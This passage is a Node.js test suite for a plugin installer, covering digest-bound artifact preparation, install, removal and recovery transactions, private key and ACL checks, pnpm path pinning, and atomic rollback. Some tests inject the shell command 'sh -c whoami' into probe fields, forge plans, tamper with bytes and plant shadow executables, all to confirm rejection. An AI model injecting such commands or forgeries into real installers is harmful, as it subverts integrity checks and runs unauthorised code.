  assert.equal(validateUpstreamArtifact(fixture.bytes, fixture.item).version, '2.3.4');
  await prepareUpstream({
    item: fixture.item,
    artifact,
    resolution: metadata,
    output: join(root, 'prepared'),
  });
  const prepared = await validatePrepared(join(root, 'prepared'), fixture.item);
  assert.equal(prepared.record.sourceType, 'npm-package-version');
  assert.match(prepared.installSpec, /\.tgz$/u);

  const changedMetadata = Buffer.from(fixture.metadataBytes.toString('utf8').replace('2.3.4', '2.3.5'));
  const changedPath = join(root, 'changed-metadata.json');
  await writeFile(changedPath, changedMetadata);
  await assert.rejects(
    () => prepareUpstream({
      item: fixture.item,
      artifact,
      resolution: changedPath,
      output: join(root, 'rejected'),
    }),
    /metadata digest mismatch/
  );
});

test('exact GitHub Release preparation binds repository, tag, asset URL, manifest, and digest', async (t) => {
  const root = await workspace(t);
  const fixture = upstreamArtifactFixture({ type: 'github-release-asset' });
  const artifact = join(root, 'release-plugin.tgz');
  await writeFile(artifact, fixture.bytes);
  await prepareUpstream({ item: fixture.item, artifact, output: join(root, 'prepared') });
  const prepared = await validatePrepared(join(root, 'prepared'), fixture.item);
  assert.equal(prepared.record.sourceType, 'github-release-asset');
  assert.equal(prepared.record.evidence.artifactSha256, fixture.item.distribution.source.assetSha256);

  const tainted = structuredClone(fixture.item);
  tainted.distribution.source.assetUrl = tainted.distribution.source.assetUrl.replace('/v2.3.4/', '/latest/');
  assert.throws(() => validateItem(tainted), /GitHub Release source/);
});

test('hosted preparation re-hashes bytes and binds a private prepared record', async (t) => {
  const root = await workspace(t);
  const fixture = hostedFixture();
  const artifact = join(root, 'plugin.tgz');
  const output = join(root, 'prepared');
  await writeFile(artifact, fixture.bytes, { mode: 0o600 });
  await prepareHosted({ item: fixture.item, artifact, output });
  const prepared = await validatePrepared(output, fixture.item);
  assert.equal(prepared.record.catalogId, fixture.item.catalogId);
  assert.equal(prepared.record.evidence.artifactSha256, fixture.item.distribution.artifactSha256);
  assert.match(prepared.installSpec, new RegExp(`${fixture.item.distribution.artifactSha256}\\.tgz$`));
});

test('batch preflight validates every prepared member before aggregate consent', async (t) => {
  const root = await workspace(t);
  const preparedRoot = join(root, 'prepared');
  await mkdir(preparedRoot);
  const first = hostedFixture({ id: 3006, slug: 'preflight-one', name: 'dsh-preflight-one' });
  const second = hostedFixture({ id: 3052, slug: 'preflight-two', name: 'dsh-preflight-two' });
  const firstArtifact = join(root, 'first.tgz');
  const secondArtifact = join(root, 'second.tgz');
  await writeFile(firstArtifact, first.bytes);
  await writeFile(secondArtifact, second.bytes);
  await prepareHosted({ item: first.item, artifact: firstArtifact, output: join(preparedRoot, '3006') });
  await prepareHosted({ item: second.item, artifact: secondArtifact, output: join(preparedRoot, '3052') });
  assert.deepEqual(
    await preflightPrepared(preparedRoot, [first.item, second.item]),
    {
      preparedRoot: await realpath(preparedRoot),
      preparedItemCount: 2,
      catalogIds: [3006, 3052],
      allPreparedAuthorityMatched: true,
    }
  );
  const secondPreparedArtifact = (await readFile(join(preparedRoot, '3052', 'prepared.json'), 'utf8'));
  const secondRecord = JSON.parse(secondPreparedArtifact);
  await writeFile(join(preparedRoot, '3052', secondRecord.install.artifactFile), Buffer.from('tampered'));
  await assert.rejects(
    () => preflightPrepared(preparedRoot, [first.item, second.item]),
    /byte count|SHA-256/
  );
});

test('transaction planning resolves exact authority members and production execution rejects test bypasses', async () => {
  const loaded = await loadAuthority();
  const first = hostedFixture({ id: 3006, slug: 'fixture-one', name: 'dsh-fixture-one' });
  const second = hostedFixture({ id: 3052, slug: 'fixture-two', name: 'dsh-fixture-two' });
  const promoted = promotedContext(loaded, fullItemSet([first.item, second.item]));
  const planOptions = {
    top10ReleaseSet: promoted.top10ReleaseSet,
    validationOptions: promoted.validationOptions,
  };
  const planned = buildPlan(promoted.authority, ['#3006', '#3052'], planOptions);
  assert.deepEqual(planned.items.map((item) => item.catalogId), [3006, 3052]);
  assert.deepEqual(planned.plan.plugins.map((item) => item.catalogId), [3006, 3052]);
  assert.equal(planned.plan.plugins[0].distribution.assetName, first.item.distribution.assetName);
  assert.equal(planned.plan.plugins[0].distribution.artifactUrl, first.item.distribution.artifactUrl);
  assert.deepEqual(planned.plan.plugins[0].runtimeAcceptance, first.item.runtimeAcceptance);
  assert.throws(
    () => buildPlan(promoted.authority, ['#3999'], planOptions),
    /lacks one exact verified authority record/
  );
  const top10 = buildPlan(promoted.authority, [], { ...planOptions, top10: true });
  assert.deepEqual(
    top10.items.map((item) => item.catalogId),
    promoted.top10ReleaseSet.entries.map((entry) => entry.catalogId)
  );
  const unfrozen = structuredClone(promoted.top10ReleaseSet);
  unfrozen.frozen = false;
  assert.throws(
    () => buildPlan(promoted.authority, [], {
      top10: true,
      top10ReleaseSet: unfrozen,
      validationOptions: promoted.validationOptions,
    }),
    /evidence-pending|payload digest|pending Top10|exact release-set bytes/i
  );
  await assert.rejects(
    () => executeTransaction({
      authority: promoted.authority,
      items: planned.items,
      planSha256: planned.planSha256,
      consentSha256: planned.planSha256,
      dshHome: '/private/dsh-home',
      harnessSource: '/private/source',
      harnessReceipt: '/private/receipt.json',
      preparedRoot: '/private/prepared',
      transactionRoot: '/private/transaction',
      runner: async () => ({ code: 0 }),
      skipHarnessGate: true,
      builtCli: process.execPath,
    }),
    /must not contain injected runners, items, plans, or Harness gate bypasses/
  );
});

test('removal planning is authority-bound and removal/recovery executors reject injected operations', async () => {
  assert.doesNotThrow(() => assertPrivateRecoveryPlatform('darwin'));
  assert.doesNotThrow(() => assertPrivateRecoveryPlatform('linux'));
  assert.doesNotThrow(() => assertPrivateRecoveryPlatform('win32'));
  assert.throws(() => assertPrivateRecoveryPlatform('freebsd'), /unsupported on freebsd/);
  const loaded = await loadAuthority();
  const first = hostedFixture({ id: 3006, slug: 'remove-one', name: 'dsh-remove-one' });
  const second = hostedFixture({ id: 3052, slug: 'remove-two', name: 'dsh-remove-two' });
  const promoted = promotedContext(loaded, fullItemSet([first.item, second.item]));
  const planned = buildRemovalPlan(promoted.authority, ['#3006', '#3052'], {
    top10ReleaseSet: promoted.top10ReleaseSet,
    validationOptions: promoted.validationOptions,
  });
  assert.equal(planned.plan.action, 'remove');
  assert.equal(planned.plan.executionOrder, 'reverse-plan-order');
  assert.deepEqual(planned.plan.plugins, [
    {
      catalogId: 3006,
      package: { name: 'dsh-remove-one', version: '1.0.0' },
      removePackage: 'dsh-remove-one',
      coldRestartRequired: true,
    },
    {
      catalogId: 3052,
      package: { name: 'dsh-remove-two', version: '1.0.0' },
      removePackage: 'dsh-remove-two',
      coldRestartRequired: true,
    },
  ]);
  const install = buildPlan(promoted.authority, ['#3006'], {
    top10ReleaseSet: promoted.top10ReleaseSet,
    validationOptions: promoted.validationOptions,
  });
  const installSource = {
    plan: install.plan,
    planSha256: install.planSha256,
    catalogIds: [3006],
    state: {
      status: 'committed',
      runtimeAcceptance: {
        schemaVersion: 1,
        accepted: [{
          catalogId: 3006,
          entryId: first.item.runtimeAcceptance.dumpConfig.entryId,
          packageName: first.item.package.name,
          version: first.item.package.version,
        }],
        dumpConfigVerified: true,
        inventoryVerifiedBeforeAndAfterRestart: true,
        unauthenticatedRootStatus: 401,
      },
    },
  };
  bindRecoverySourceToAuthority(
    installSource,
    { top10ReleaseSet: promoted.top10ReleaseSet },
    promoted.authority,
    promoted.validationOptions
  );
  installSource.state.runtimeAcceptance.accepted[0].command = 'sh -c whoami';
  assert.throws(
    () => bindRecoverySourceToAuthority(
      installSource,
      { top10ReleaseSet: promoted.top10ReleaseSet },
      promoted.authority,
      promoted.validationOptions
    ),
    /source runtime acceptance #3006 is malformed|unsupported executable fields/
  );
  await assert.rejects(
    () => executeRemovalTransaction({
      authorityContext: {},
      consentSha256: planned.planSha256,
      dshHome: '/private/dsh-home',
      harnessReceipt: '/private/receipt.json',
      harnessSource: '/private/source',
      ids: ['#3006'],
      top10: false,
      transactionRoot: '/private/remove',
      runner: () => ({ code: 0 }),
    }),
    /must not contain injected runners/
  );
  await assert.rejects(
    () => executeRecoveryTransaction({
      authorityContext: {},
      consentSha256: 'a'.repeat(64),
      dshHome: '/private/dsh-home',
      harnessReceipt: '/private/receipt.json',
      harnessSource: '/private/source',
      sourceTransactionRoot: '/private/source-transaction',
      transactionRoot: '/private/recovery',
      snapshot: {},
    }),
    /must not contain injected runners, plans, snapshots/
  );
});

test('retained transaction recovery binds plan, baseline, and snapshot digests', async (t) => {
  const root = await workspace(t);
  const profile = join(root, 'profile');
  const transaction = join(root, 'source-transaction');
  const snapshot = join(transaction, 'snapshot');
  await mkdir(profile, { recursive: true });
  await mkdir(transaction, { mode: 0o700 });
  await writeFile(join(profile, 'package.json'), `${JSON.stringify({
    name: 'dsh-profile-web',
    private: true,
    dependencies: {},
    dsh: {
      profile: {
        bundles: ['@deepseek-ai/dsh-base', '@deepseek-ai/dsh-web-app'],
        patchReload: 'live',
      },
    },
  }, null, 2)}\n`);
  await writeFile(join(profile, 'pnpm-lock.yaml'), 'lockfileVersion: 9.0\n');
  await writeFile(
    join(profile, 'pnpm-workspace.yaml'),
    'packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\n'
  );
  await writeFile(join(profile, 'cordis.patch.yml'), '[]\n');
  const closure = await captureProfileClosure(profile);
  await createProfileSnapshot(profile, snapshot);

  const loaded = await loadAuthority();
  const fixture = hostedFixture({ id: 3006, slug: 'recover-one', name: 'dsh-recover-one' });
  const promoted = promotedContext(loaded, fullItemSet([fixture.item]));
  const removal = buildRemovalPlan(promoted.authority, ['#3006'], {
    top10ReleaseSet: promoted.top10ReleaseSet,
    validationOptions: promoted.validationOptions,
  });
  const planRecord = {
    schemaVersion: 1,
    planSha256: removal.planSha256,
    catalogIds: [3006],
    plan: removal.plan,
  };
  const baselineRecord = { schemaVersion: 1, closure, inventory: {} };
  const baselineBytes = Buffer.from(`${JSON.stringify(baselineRecord, null, 2)}\n`);
  const snapshotManifestBytes = await readFile(join(snapshot, 'snapshot.json'));
  const state = {
    schemaVersion: 1,
    status: 'removed',
    planSha256: removal.planSha256,
    catalogIds: [3006],
    atomic: false,
    coldRestartVerified: true,
    rollbackBaselineSha256: sha256(baselineBytes),
    snapshotManifestSha256: sha256(snapshotManifestBytes),
    terminalClosureSha256: closure.closureSha256,
    terminalInventorySha256: sha256(Buffer.from('{}\n')),
    removalVerified: true,
  };
  const recoveryKey = randomBytes(32);
  const authentication = buildRecoveryAuthentication(state, recoveryKey);
  await writeFile(
    join(transaction, 'plan.json'),
    `${JSON.stringify(planRecord, null, 2)}\n`,
    { mode: 0o600 }
  );
  await writeFile(join(transaction, 'rollback-baseline.json'), baselineBytes, { mode: 0o600 });
  await writeFile(
    join(transaction, 'state.json'),
    `${JSON.stringify(state, null, 2)}\n`,
    { mode: 0o600 }
  );
  await writeFile(
    join(transaction, 'recovery-auth.json'),
    `${JSON.stringify(authentication, null, 2)}\n`,
    { mode: 0o600 }
  );

  const source = await loadRecoverySource(transaction, recoveryKey);
  bindRecoverySourceToAuthority(
    source,
    { top10ReleaseSet: promoted.top10ReleaseSet },
    promoted.authority,
    promoted.validationOptions
  );
  const recovery = buildRecoveryPlan(source);
  assert.equal(recovery.plan.action, 'recover');
  assert.equal(recovery.plan.sourceTransaction.status, 'removed');
  assert.equal(recovery.plan.restoreTarget.closureSha256, closure.closureSha256);
  assert.equal(
    recovery.planSha256,
    sha256(Buffer.from(`${JSON.stringify(stable(recovery.plan))}\n`))
  );
  await assert.rejects(
    () => loadRecoverySource(transaction, randomBytes(32)),
    /not authenticated by this DSH_HOME recovery trust root/
  );
  const forgedPlan = structuredClone(source);
  forgedPlan.plan.plugins[0].removePackage = 'dsh-attacker';
  assert.throws(
    () => bindRecoverySourceToAuthority(
      forgedPlan,
      { top10ReleaseSet: promoted.top10ReleaseSet },
      promoted.authority,
      promoted.validationOptions
    ),
    /exact plan reconstructed from current authority/
  );

  await writeFile(
    join(transaction, 'rollback-baseline.json'),
    `${JSON.stringify({ ...baselineRecord, inventory: { tampered: '1.0.0' } }, null, 2)}\n`,
    { mode: 0o600 }
  );
  await assert.rejects(
    () => loadRecoverySource(transaction, recoveryKey),
    /rollback baseline digest mismatch/
  );
});

test('recovery trust root creates and reloads one private 32-byte key', async (t) => {
  const dshHome = await realpath(await workspace(t));
  const created = await loadRecoveryKey(dshHome, { create: true });
  assert.equal(created.length, 32);
  assert.deepEqual(await loadRecoveryKey(dshHome), created);
  const root = join(dshHome, '.dsh-plugin-installer');
  const key = join(root, 'hmac-sha256.key');
  const rootStat = await lstat(root);
  const keyStat = await lstat(key);
  assert.equal(rootStat.isDirectory(), true);
  assert.equal(rootStat.isSymbolicLink(), false);
  assert.equal(keyStat.isFile(), true);
  assert.equal(keyStat.isSymbolicLink(), false);
  if (process.platform !== 'win32') {
    assert.equal(rootStat.mode & 0o077, 0);
    assert.equal(keyStat.mode & 0o077, 0);
  } else {
    const rootProof = await secureWindowsPrivatePath(root, 'directory', 'verify');
    const keyProof = await secureWindowsPrivatePath(key, 'file', 'verify');
    assert.equal(rootProof.ownerSid, rootProof.currentSid);
    assert.equal(rootProof.ruleCount, 1);
    assert.equal(rootProof.ruleSid, rootProof.currentSid);
    assert.equal(rootProof.protected, true);
    assert.equal(rootProof.inherited, false);
    assert.equal(rootProof.inheritanceFlags, 3);
    assert.equal(keyProof.ownerSid, keyProof.currentSid);
    assert.equal(keyProof.ruleCount, 1);
    assert.equal(keyProof.ruleSid, keyProof.currentSid);
    assert.equal(keyProof.protected, true);
    assert.equal(keyProof.inherited, false);
    assert.equal(keyProof.inheritanceFlags, 0);
  }
});

test('Windows recovery ACL runner uses a bounded cold-start budget and validates SID-only proof', async () => {
  const calls = [];
  const execute = async (...args) => {
    calls.push(args);
    return {
      stdout: `${JSON.stringify({
        schemaVersion: 1,
        kind: 'directory',
        currentSid: 'S-1-5-21-1000',
        ownerSid: 'S-1-5-21-1000',
        protected: true,
        ruleCount: 1,
        ruleSid: 'S-1-5-21-1000',
        inherited: false,
        allow: true,
        fullControl: true,
        inheritanceFlags: 3,
        propagationFlags: 0,
      })}\n`,
      stderr: '',
    };
  };
  const proof = await secureWindowsPrivatePath(
    'C:\\private\\trust-root',
    'directory',
    'configure',
    {
      environment: {
        SystemRoot: 'C:\\Windows',
        TEMP: 'C:\\Temp',
        SECRET_TOKEN: 'must-not-cross-boundary',
      },
      execute,
      platform: 'win32',
    }
  );
  assert.equal(proof.ruleSid, proof.currentSid);
  assert.equal(WINDOWS_PRIVATE_ACL_TIMEOUT_MS, 60_000);
  assert.equal(calls.length, 1);
  const [, args, options] = calls[0];
  assert.deepEqual(args.slice(0, 6), [
    '-NoLogo', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command',
  ]);
  assert.equal(args[6], WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT);
  assert.equal(options.timeout, WINDOWS_PRIVATE_ACL_TIMEOUT_MS);
  assert.equal(options.env.DSH_PLUGIN_PRIVATE_PATH, 'C:\\private\\trust-root');
  assert.equal(options.env.DSH_PLUGIN_PRIVATE_KIND, 'directory');
  assert.equal(options.env.DSH_PLUGIN_PRIVATE_ACTION, 'configure');
  assert.equal(options.env.SECRET_TOKEN, undefined);
  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /SetAccessRuleProtection\(\$true, \$false\)/);
  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /Rules\.Count -ne 1/i);
  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /FileSystemRights -ne \$fullControl/);
  assert.doesNotMatch(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /S-1-5-18/);

  await assert.rejects(
    () => secureWindowsPrivatePath('C:\\private\\trust-root', 'directory', 'verify', {
      environment: { SystemRoot: 'C:\\Windows' },
      execute: async () => ({
        stdout: '{"schemaVersion":1,"kind":"directory","currentSid":"S-1-5-21-1000","ownerSid":"S-1-5-18","protected":true,"ruleCount":1,"ruleSid":"S-1-5-21-1000","inherited":false,"allow":true,"fullControl":true,"inheritanceFlags":3,"propagationFlags":0}\n',
        stderr: '',
      }),
      platform: 'win32',
    }),
    /malformed or weaker/
  );
});

test('private pnpm PATH binding pins the absolute 11.7.0 bytes and detects later replacement', async (t) => {
  const root = await realpath(await workspace(t));
  const sourceBin = join(root, 'source-bin');
  const profileCwd = join(root, 'profile-cwd');
  const runtimeRoot = join(root, 'runtime');
  await mkdir(sourceBin);
  await mkdir(profileCwd);
  await mkdir(runtimeRoot);
  const commandName = process.platform === 'win32' ? 'pnpm.cmd' : 'pnpm';
  const source = join(sourceBin, commandName);
  const cwdShadow = join(profileCwd, commandName);
  const sourceBytes = process.platform === 'win32'
    ? '@echo off\r\necho 11.7.0\r\n'
    : '#!/bin/sh\nprintf "11.7.0\\n"\n';
  await writeFile(source, sourceBytes, { mode: 0o700 });
  await writeFile(
    cwdShadow,
    process.platform === 'win32'
      ? '@echo off\r\necho 99.0.0\r\n'
      : '#!/bin/sh\nprintf "99.0.0\\n"\n',
    { mode: 0o700 }
  );
  const environment = {
    PATH: sourceBin,
    PATHEXT: '.COM;.EXE;.BAT;.CMD',
    SystemRoot: process.env.SystemRoot,
    WINDIR: process.env.WINDIR,
    COMSPEC: process.platform === 'win32'
      ? join(profileCwd, 'untrusted-command-processor.exe')
      : process.env.COMSPEC,
    TEMP: process.env.TEMP ?? tmpdir(),
    TMP: process.env.TMP ?? tmpdir(),
  };
  const identity = await resolvePnpmExecutable(environment, { commandCwd: profileCwd });
  assert.equal(identity.path, await realpath(source));
  assert.equal(identity.sha256, sha256(Buffer.from(sourceBytes)));

  const binding = await createPrivatePnpmBinding(environment, runtimeRoot, {
    commandCwd: profileCwd,
  });
  assert.equal(binding.receipt.version, '11.7.0');
  assert.equal(binding.receipt.targetSha256, identity.sha256);
  assert.equal(binding.receipt.privatePathPrecedence, true);
  assert.equal(binding.environment.PATH.split(process.platform === 'win32' ? ';' : ':')[0], join(runtimeRoot, 'pnpm-binding'));
  assert.equal(
    binding.environment.NoDefaultCurrentDirectoryInExePath,
    process.platform === 'win32' ? '1' : undefined
  );
  if (process.platform === 'win32') {
    assert.equal(
      binding.environment.COMSPEC,
      await realpath(join(process.env.SystemRoot, 'System32', 'cmd.exe'))
    );
  }
  const before = spawnSync('pnpm', ['--version'], {
    cwd: profileCwd,
    encoding: 'utf8',
    env: binding.environment,
    shell: process.platform === 'win32',
    windowsHide: true,
  });
  assert.equal(before.status, 0);
  assert.equal(before.stdout.trim(), '11.7.0');

  await writeFile(source, process.platform === 'win32'
    ? '@echo off\r\necho 99.0.0\r\n'
    : '#!/bin/sh\nprintf "99.0.0\\n"\n');
  const after = spawnSync('pnpm', ['--version'], {
    cwd: profileCwd,
    encoding: 'utf8',
    env: binding.environment,
    shell: process.platform === 'win32',
    windowsHide: true,
  });
  assert.notEqual(after.status, 0);
  assert.match(after.stderr, /bound pnpm (?:digest|identity) changed/);
  assert.doesNotMatch(after.stderr, new RegExp(source.replace(/[.*+?^${}()|[\]\\]/gu, '\\$&')));
});

test('private pnpm binding rejects unsupported execution platforms before PATH resolution', async () => {
  assert.equal(requiresPnpmCommandShimShell('darwin'), false);
  assert.equal(requiresPnpmCommandShimShell('linux'), false);
  assert.equal(requiresPnpmCommandShimShell('win32'), true);
  assert.equal(pnpmCommandShimShell({}, 'linux'), false);
  assert.equal(
    pnpmCommandShimShell({ COMSPEC: 'C:\\Windows\\System32\\cmd.exe' }, 'win32'),
    'C:\\Windows\\System32\\cmd.exe'
  );
  assert.throws(
    () => pnpmCommandShimShell({ COMSPEC: '\\system\\cmd.exe' }, 'win32'),
    /absolute/
  );
  assert.throws(() => pnpmCommandShimShell({ COMSPEC: 'cmd.exe' }, 'win32'), /absolute/);
  assert.throws(() => requiresPnpmCommandShimShell('freebsd'), /unsupported on freebsd/);
  await assert.rejects(
    () => resolvePnpmExecutable({ PATH: '/not/consulted' }, { platform: 'freebsd' }),
    /unsupported on freebsd/
  );
});

test('effective policy verification executes the platform pnpm shim with only fixed keys', async (t) => {
  const root = await realpath(await workspace(t));
  const sourceBin = join(root, 'policy-bin');
  await mkdir(sourceBin);
  const commandName = process.platform === 'win32' ? 'pnpm.cmd' : 'pnpm';
  const source = join(sourceBin, commandName);
  const sourceText = process.platform === 'win32'
    ? [
        '@echo off',
        'if "%~6"=="allowBuilds" (echo {"@example/plugin":true} & exit /b 0)',
        'if "%~6"=="dangerouslyAllowAllBuilds" (echo false & exit /b 0)',
        'if "%~6"=="strictDepBuilds" (echo true & exit /b 0)',
        'exit /b 2',
        '',
      ].join('\r\n')
    : [
        '#!/bin/sh',
        'case "$6" in',
        "  allowBuilds) printf '%s\\n' '{\"@example/plugin\":true}' ;;",
        "  dangerouslyAllowAllBuilds) printf '%s\\n' 'false' ;;",
        "  strictDepBuilds) printf '%s\\n' 'true' ;;",
        '  *) exit 2 ;;',
        'esac',
        '',
      ].join('\n');
  await writeFile(source, sourceText, { mode: 0o700 });
  const environment = {
    PATH: sourceBin,
    PATHEXT: '.COM;.EXE;.BAT;.CMD',
    COMSPEC: process.env.COMSPEC,
    SystemRoot: process.env.SystemRoot,
    WINDIR: process.env.WINDIR,
  };
  assert.deepEqual(
    verifyEffectivePnpmBuildPolicy(root, ['@example/plugin'], true, { environment }),
    {
      allowBuilds: { '@example/plugin': true },
      dangerouslyAllowAllBuilds: false,
      strictDepBuilds: true,
    }
  );
});

test('authority-bound runtime acceptance commits only after dump, inventory, and restart evidence agree', async () => {
  const first = hostedFixture({ id: 3006, slug: 'accept-one', name: 'dsh-accept-one' }).item;
  const second = hostedFixture({ id: 3052, slug: 'accept-two', name: 'dsh-accept-two' }).item;
  const baselineInventory = { 'existing-plugin': '0.9.0' };
  const expectedInventory = {
    'dsh-accept-one': '1.0.0',
    'dsh-accept-two': '1.0.0',
    'existing-plugin': '0.9.0',
  };
  const dumpConfigOutput = [
    '- id: existing',
    '  name: existing-plugin',
    '- id: fixture-3006',
    '  name: dsh-accept-one',
    '  config:',
    '    credential: never-retain-this-value',
    '- id: fixture-3052',
    '  name: dsh-accept-two',
    '',
  ].join('\n');
  assert.deepEqual(parseDumpConfigEntries(dumpConfigOutput), [
    { id: 'existing', name: 'existing-plugin', disabled: false },
    { id: 'fixture-3006', name: 'dsh-accept-one', disabled: false },
    { id: 'fixture-3052', name: 'dsh-accept-two', disabled: false },
  ]);
  let rollbackCalls = 0;
  const result = await runAtomicAcceptanceBoundary(async () => {
    const evidence = verifyRuntimeAcceptanceEvidence([first, second], {
      baselineInventory,
      dumpConfigOutput,
      installedInventory: expectedInventory,
      restartedInventory: expectedInventory,
    });
    return { state: { status: 'committed', runtimeAcceptance: evidence } };
  }, async () => {
    rollbackCalls += 1;
    return completeRollback();
  });
  assert.equal(result.state.status, 'committed');
  assert.equal(result.state.runtimeAcceptance.accepted.length, 2);
  assert.equal(result.state.runtimeAcceptance.dumpConfigVerified, true);
  assert.doesNotMatch(JSON.stringify(result.state), /never-retain-this-value/);
  assert.equal(rollbackCalls, 0);
});

test('authority-bound functional probe failure restores the whole batch with no partial success', async () => {
  const first = hostedFixture({ id: 3006, slug: 'rollback-one', name: 'dsh-rollback-one' }).item;
  const second = hostedFixture({ id: 3052, slug: 'rollback-two', name: 'dsh-rollback-two' }).item;
  const simulatedProfile = [];
  let rollbackCalls = 0;
  await assert.rejects(
    () => runAtomicAcceptanceBoundary(async () => {
      simulatedProfile.push(first.package.name, second.package.name);
      return verifyRuntimeAcceptanceEvidence([first, second], {
        baselineInventory: {},
        dumpConfigOutput: [
          '- id: fixture-3006',
          '  name: dsh-rollback-one',
          '- id: fixture-3052',
          '  name: wrong-package',
          '',
        ].join('\n'),
        installedInventory: {
          'dsh-rollback-one': '1.0.0',
          'dsh-rollback-two': '1.0.0',
        },
        restartedInventory: {
          'dsh-rollback-one': '1.0.0',
          'dsh-rollback-two': '1.0.0',
        },
      });
    }, async () => {
      rollbackCalls += 1;
      simulatedProfile.length = 0;
      return completeRollback();
    }),
    /authority-bound functional entry probe failed; atomic rollback completed/
  );
  assert.deepEqual(simulatedProfile, []);
  assert.equal(rollbackCalls, 1);
});

test('cold-start failure enters the same complete rollback boundary', async () => {
  const simulatedProfile = ['dsh-cold-start-fixture'];
  let rollbackCalls = 0;
  await assert.rejects(
    () => runAtomicAcceptanceBoundary(async () => {
      throw new Error('cold Web probe did not expose the expected unauthenticated 401 boundary');
    }, async () => {
      rollbackCalls += 1;
      simulatedProfile.length = 0;
      return completeRollback();
    }),
    /cold Web probe.*atomic rollback completed/
  );
  assert.deepEqual(simulatedProfile, []);
  assert.equal(rollbackCalls, 1);
});

test('missing or executable runtime probe authority is rejected and rolled back', async () => {
  const item = hostedFixture({ id: 3006, slug: 'missing-probe', name: 'dsh-missing-probe' }).item;
  delete item.runtimeAcceptance;
  assert.throws(() => validateItem(item), /runtimeAcceptance/i);
  let rollbackCalls = 0;
  await assert.rejects(
    () => runAtomicAcceptanceBoundary(async () => verifyRuntimeAcceptanceEvidence([item], {
      baselineInventory: {},
      dumpConfigOutput: '- id: fixture-3006\n  name: dsh-missing-probe\n',
      installedInventory: { 'dsh-missing-probe': '1.0.0' },
      restartedInventory: { 'dsh-missing-probe': '1.0.0' },
    }), async () => {
      rollbackCalls += 1;
      return completeRollback();
    }),
    /runtime acceptance authority is malformed.*atomic rollback completed/
  );
  assert.equal(rollbackCalls, 1);

  const injected = hostedFixture({ id: 3007, slug: 'injected-probe', name: 'dsh-injected-probe' }).item;
  injected.runtimeAcceptance.functionalProbe.command = 'sh -c whoami';
  assert.throws(() => validateItem(injected), /runtimeAcceptance|functionalProbe|keys/i);
  assert.throws(
    () => verifyRuntimeAcceptanceEvidence([injected], {
      baselineInventory: {},
      dumpConfigOutput: '- id: fixture-3007\n  name: dsh-injected-probe\n',
      installedInventory: { 'dsh-injected-probe': '1.0.0' },
      restartedInventory: { 'dsh-injected-probe': '1.0.0' },
    }),
    /unsupported executable fields/
  );
});

test('four-file snapshot restores exact bytes and closure verification detects leftover installed packages', async (t) => {
  const root = await workspace(t);
  const profile = join(root, 'profile');
  const snapshot = join(root, 'snapshot');
  await mkdir(profile, { recursive: true });
  const baselineManifest = {
    name: 'dsh-profile-web',
    private: true,
    dependencies: {},
    dsh: {
      profile: {
        bundles: ['@deepseek-ai/dsh-base', '@deepseek-ai/dsh-web-app'],
        patchReload: 'live',
      },
    },
  };
  await writeFile(join(profile, 'package.json'), `${JSON.stringify(baselineManifest, null, 2)}\n`);
  await writeFile(join(profile, 'pnpm-lock.yaml'), 'lockfileVersion: 9.0\n');
  await writeFile(
    join(profile, 'pnpm-workspace.yaml'),
    'packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\n'
  );
  await writeFile(join(profile, 'cordis.patch.yml'), '[]\n');
  const baselineClosure = await captureProfileClosure(profile);
  await createProfileSnapshot(profile, snapshot);
  await writeFile(join(profile, 'package.json'), '{"broken":true}\n');
  await writeFile(join(profile, 'pnpm-lock.yaml'), 'lockfileVersion: broken\n');
  await restoreProfileSnapshot(profile, snapshot);
  assert.deepEqual(
    JSON.parse(await readFile(join(profile, 'package.json'), 'utf8')),
    baselineManifest
  );
  assert.equal(await readFile(join(profile, 'pnpm-lock.yaml'), 'utf8'), 'lockfileVersion: 9.0\n');
  const rogue = join(profile, 'node_modules', 'rogue');
  await mkdir(rogue, { recursive: true });
  await writeFile(join(rogue, 'package.json'), '{"name":"rogue","version":"9.9.9"}\n');
  assert.equal((await verifyProfileClosure(profile, baselineClosure)).matches, false);
  await rm(join(profile, 'node_modules'), { recursive: true, force: true });
  assert.equal((await verifyProfileClosure(profile, baselineClosure)).matches, true);
});

test('Plugin Skill keeps Top10 and all 80 entries fail closed without receipts', async () => {
  const skill = await readFile('skills/dsh-plugin-installer/SKILL.md', 'utf8');
  const transaction = await readFile(
    'skills/dsh-plugin-installer/scripts/install-transaction.mjs',
    'utf8'
  );
  assert.match(skill, /80 curated Plugin records/);
  assert.match(skill, /zero verified installation\s+items/);
  assert.match(skill, /Top10 is not frozen and cannot start a transaction/);
  assert.match(skill, /npm-package-version/);
  assert.match(skill, /github-release-asset/);
  assert.match(skill, /git-commit/);
  assert.match(skill, /fixed argument array and\n+   `shell: false`/);
  assert.match(skill, /writes `state\.json` with `status: "committed"` only after/);
  assert.match(skill, /failed single item or Top10 member restores the entire retained/);
  assert.match(skill, /current-user SID-only/);
  assert.match(transaction, /function buildChildEnvironment/);
  assert.doesNotMatch(transaction, /env:\s*\{\s*\.\.\.process\.env/);
  assert.doesNotMatch(skill, /awaiting-runtime-acceptance/);
});
